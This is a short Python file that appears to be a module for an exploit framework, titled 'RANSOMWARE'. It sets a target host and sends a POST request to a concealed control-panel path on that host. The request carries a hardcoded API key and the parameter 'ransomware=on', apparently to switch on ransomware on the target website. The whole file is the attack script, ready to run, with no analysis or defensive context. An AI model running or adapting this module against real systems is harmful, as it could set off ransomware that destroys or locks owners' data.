import Util, random,requests

class exploit(object):
    def __init__(self):
        self.Name = "RANSOMWARE"
        self.Description = "the website RANSOMWARE"
        self.Author = "René van Vliet"
        self.Version = "0.1"
        self.POC = ""
        self.Type = Util.Type.Local
        self.Platform = Util.Platform.Linux

        self.HOST = None
        self.PORT = None


    def exploit(self):
        requests.post(f"http://{self.HOST}/controlpanel_68696464656e.php", data={"API":"8a77463e-149e-4443-a7f7-9e40cb0f0e11","ransomware":"on"})


    def _validate(self):
        if(self.HOST == None):
            print(f"[{self.Name}] No valid parameters.")
            exit(1)


    def run(self):
        self._validate()
        self.exploit()
